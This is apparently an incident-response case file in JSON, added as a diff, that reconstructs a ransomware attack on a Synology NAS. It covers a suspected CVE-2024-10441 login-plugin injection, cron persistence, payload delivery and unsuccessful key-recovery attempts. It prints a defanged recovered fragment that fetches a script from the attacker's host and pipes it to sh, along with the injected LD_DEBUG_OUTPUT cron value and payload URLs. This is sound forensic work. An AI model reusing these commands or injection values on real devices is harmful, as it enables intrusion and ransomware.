@@ -1,0 +1,214 @@
+{
+  "schema_version": 1,
+  "case_id": "NAS-A-20261029",
+  "reviewed_at": "2026-10-30T00:49:17.454937+08:00",
+  "assessment": {
+    "associated_external_node": "46[.]8[.]78[.]122",
+    "associated_source_and_delivery_node_confidence": "high",
+    "most_supported_ingress": "DSM Web login-plugin environment injection compatible withCVE-2024-10441",
+    "ingress_assessment_strength": "strongly supported,incomplete request/execution chain",
+    "complete_original_http_request_recovered": false,
+    "exact_initial_intrusion_time_known": false,
+    "actor_terminal_or_person_identified": false,
+    "exact_shared_binary_or_delivery_batch_proven": false
+  },
+  "events": [
+    {
+      "id": "N1",
+      "time": "2026-10-29T05:01:58.025+08:00",
+      "level": "observed",
+      "source": "owner-operated management relay application log",
+      "observation": "Connection from46[.]8[.]78[.]122:48388 to the NAS management proxy",
+      "does_not_prove": "Exact original HTTP request or operator terminal"
+    },
+    {
+      "id": "N2",
+      "time": "2026-10-29T05:01:59.110+08:00",
+      "level": "observed",
+      "source": "same relay application log",
+      "observation": "Second connection from46[.]8[.]78[.]122:48398 to same proxy/client instance"
+    },
+    {
+      "id": "N3",
+      "time": "2026-10-29T05:02:00+08:00",
+      "level": "observed",
+      "source": "readable auth.log.L0CK3D area",
+      "observation": "DSM login-flow authentication failure;source is loopback",
+      "request_causally_linked_to_N1_or_N2": false
+    },
+    {
+      "id": "X1",
+      "time": null,
+      "level": "observed_fragment",
+      "source": "first RAM acquisition file offset4993348294",
+      "observation": "LD_DEBUG_OUTPUT=/etc/cron.d/synotgzz;ESCAPE=PLUGIN_VALUE_START;adjacent Auth7login fragment",
+      "exact_request_time_known": false
+    },
+    {
+      "id": "X2",
+      "time": "2026-10-29T05:03:01+08:00",
+      "level": "observed_with_inferred_year",
+      "source": "saved crond-related text",
+      "observation": "crond mentions /etc/cron.d/synotgzz.18887",
+      "year_explicit_in_original": false,
+      "proves_complete_payload_execution": false
+    },
+    {
+      "id": "X3",
+      "time": "2026-10-29T05:03:19+08:00",
+      "level": "observed",
+      "source": "rm.log and directory slack",
+      "observation": "uid/euid0 rm invocation names five synotgzz.PID cron paths",
+      "per_target_delete_return_status_available": false
+    },
+    {
+      "id": "D1",
+      "time": null,
+      "level": "observed_fragment",
+      "source": "strictly decoded saved swap page associated with crondPID13917",
+      "displayed_suffix": "l -s hxxp://46[.]8[.]78[.]122/xdy5[.]sh|sh",
+      "private_original_suffix_sha256": "f8c61f8717b49b6713b268b59ec6cae2ff21912d9b022e22ae1e8a59175a638e",
+      "complete_command_recovered": false
+    },
+    {
+      "id": "D2",
+      "time": null,
+      "level": "observed_orphan_attribute",
+      "source": "freed ext4 EAblock164366",
+      "origin_url": "hxxp://46[.]8[.]78[.]122/xdy5[.]6xc?x86_64",
+      "directly_bound_to_libgld": false
+    },
+    {
+      "id": "D3",
+      "time": null,
+      "level": "observed_deleted_directory_entry",
+      "source": "/usr/bin directory slack",
+      "observation": "libgld points to reused inode43222;original inode and executable not recovered",
+      "actual_execution_proven": false
+    },
+    {
+      "id": "E1",
+      "time": "2026-10-29T05:09:45.916+08:00",
+      "level": "marker_time",
+      "source": "/tmp/log.0mtime",
+      "observation": "Encryption-start-compatible marker"
+    },
+    {
+      "id": "E2",
+      "time": "2026-10-29T05:09:45.923+08:00",
+      "level": "marker_time",
+      "source": "ransom-note mtime",
+      "observation": "Ransom note temporally adjacent to start marker"
+    },
+    {
+      "id": "E3",
+      "time": "2026-10-29T05:10:20+08:00",
+      "level": "observed",
+      "source": "rm.log and crond.service-related memory object",
+      "observation": "uid/euid0 rm invocation targets /bin/l0ck.enc",
+      "is_libgld_deletion_time": false
+    },
+    {
+      "id": "E4",
+      "time": "2026-10-29T10:24:30.003+08:00",
+      "level": "marker_time",
+      "source": "/tmp/log.1mtime",
+      "observation": "Completion-compatible marker;not direct encryptor exit observation"
+    }
+  ],
+  "causal_edges": [
+    {
+      "from": "N1/N2",
+      "to": "N3",
+      "assessment": "time-correlated;exact request not recovered"
+    },
+    {
+      "from": "N3/X1",
+      "to": "X2/X3",
+      "assessment": "strongly supported CVE-compatible login-plugin environment injection to cron;full task content absent"
+    },
+    {
+      "from": "X2",
+      "to": "D1",
+      "assessment": "command fragment tied to saved crond memory;successful download not directly logged"
+    },
+    {
+      "from": "D1/D2",
+      "to": "D3",
+      "assessment": "plausible delivery/executable linkage;orphan-xattr ownership and full script missing"
+    },
+    {
+      "from": "D3",
+      "to": "E1/E2/E4",
+      "assessment": "candidate encryptor path consistent with public cases;no complete own binary/process lineage"
+    }
+  ],
+  "time_alignment": {
+    "times": {
+      "first_related_management_connection": "2026-10-29T05:01:58.025000+08:00",
+      "second_related_management_connection": "2026-10-29T05:01:59.110000+08:00",
+      "login_failure": "2026-10-29T05:02:00+08:00",
+      "cron_mention": "2026-10-29T05:03:01+08:00",
+      "cron_cleanup": "2026-10-29T05:03:19+08:00",
+      "start_marker": "2026-10-29T05:09:45.916000+08:00",
+      "loader_cleanup": "2026-10-29T05:10:20+08:00",
+      "completion_marker": "2026-10-29T10:24:30.003000+08:00"
+    },
+    "deltas_seconds": {
+      "first_connection_to_login_failure": 1.975,
+      "first_connection_to_cron_mention": 62.975,
+      "cron_mention_to_cleanup": 18.0,
+      "first_connection_to_start_marker": 467.891,
+      "start_marker_to_loader_cleanup": 34.084,
+      "start_to_completion_markers": 18884.087
+    },
+    "clock_alignment_independently_established": false,
+    "cron_record_year_inferred": true,
+    "complete_original_request_or_command_available": false
+  },
+  "corrected_process_association": {
+    "comm": "crond",
+    "pid": 13917,
+    "tgid": 13917,
+    "pgd_physical": 9071656960,
+    "swap_device": "zram0",
+    "slot": 54600,
+    "chain": "zsmalloc handle -> zram device/table -> slot -> PT/PD/PUD/PGD -> mm_struct -> task_struct -> comm and pid/tgid",
+    "heap_readable_pages": 19,
+    "heap_range_pages": 33,
+    "full_original_command_recovered": false,
+    "complete_argv_env_recovered": false,
+    "does_not_alone_prove_payload_execution": true
+  },
+  "earlier_persistence": {
+    "script_sha256": "5dc595d955cc5b268f7d40e36eb6ed22005fee2efdc64eab5029df5a71fd7d0f",
+    "source_url": "hxxp://zuoye[.]free[.]fr/files/synology-10441[.]png",
+    "payload_url": "hxxp://zuoye[.]free[.]fr/files/000119[.]png",
+    "same_actor_or_relation_to_oct29_encryption_proven": false,
+    "timestamp_authenticity_independently_verified": false
+  },
+  "additional_completed_key_checks": {
+    "completed_at": "2026-10-29T23:36:44.918204+08:00",
+    "effective_decryption_key_found": false,
+    "tar_chacha_rounds": 8,
+    "tar_counters": [
+      4,
+      5
+    ],
+    "tar_jobs": 564,
+    "tar_position_layout_attempts": 67489880036,
+    "tar_header_candidates": 0,
+    "gpr_distinct_sets": 964,
+    "priority_aes_values": 2332148,
+    "priority_footer_tests": 56251409760,
+    "linked_pgd_roots": 125,
+    "new_audited_short_bridges": 14,
+    "distinct_pointer_contexts": 1293,
+    "linked_context_aes_values": 349849,
+    "linked_context_footer_tests": 8438357880,
+    "globally_deduplicated_total_claimed": false,
+    "full_range_chacha12_or20_done": false
+  },
+  "memory_preservation_record": "memory-preservation-20261030.json",
+  "learning_material_recovery_details_included": false
+}
